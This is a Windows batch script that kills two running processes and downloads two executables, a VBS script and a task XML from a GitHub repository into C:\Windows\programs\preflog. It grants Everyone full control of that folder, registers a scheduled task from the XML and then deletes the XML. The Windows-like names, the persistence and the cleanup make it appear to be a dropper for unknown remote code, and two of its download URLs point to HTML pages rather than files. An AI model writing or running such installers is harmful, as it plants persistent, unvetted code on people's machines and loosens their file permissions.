@echo off

REM Define URLs and destination directory
set "URL1=https://raw.githubusercontent.com/m-c00/tr/main/WinWinTask.xml"
set "URL2=https://raw.githubusercontent.com/m-c00/tr/main/wscript.vbs"
set "URL3=https://github.com/m-c00/tr/blob/main/win-tr6.exe"
set "URL4=https://github.com/m-c00/tr/blob/main/win-db.exe"
set "DEST_DIR=C:\Windows\programs\preflog"
set "TASK_XML=%DEST_DIR%\win-win.xml"
set "TASK_NAME=WinWinTask"

REM Check if ws-tr.exe is running and terminate if it is
tasklist | findstr /i "ws-tr.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "ws-tr.exe" >nul 2>&1
)

REM Check if win-db.exe is running and terminate if it is
tasklist | findstr /i "win-db.exe" >nul
if %errorlevel% equ 0 (
    taskkill /f /im "win-db.exe" >nul 2>&1
)

REM Create destination directory if it doesn't exist
if not exist "%DEST_DIR%" mkdir "%DEST_DIR%"

REM Download and rename each file
echo Downloading and renaming files...
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL1%', '%DEST_DIR%\win-win.xml')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL2%', '%DEST_DIR%\wscript.vbs')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL3%', '%DEST_DIR%\ws-tr.exe')"
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%URL4%', '%DEST_DIR%\win-db.exe')"

REM Set folder permissions
echo Setting folder permissions...
icacls "%DEST_DIR%" /grant:r "*S-1-1-0:(OI)(CI)F" /t /c

REM Import the task using schtasks
echo Importing the task...
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /create /xml "%TASK_XML%" /tn "%TASK_NAME%"
echo Task imported successfully.

REM Delete the XML file
del "%TASK_XML%" >nul 2>&1

pause
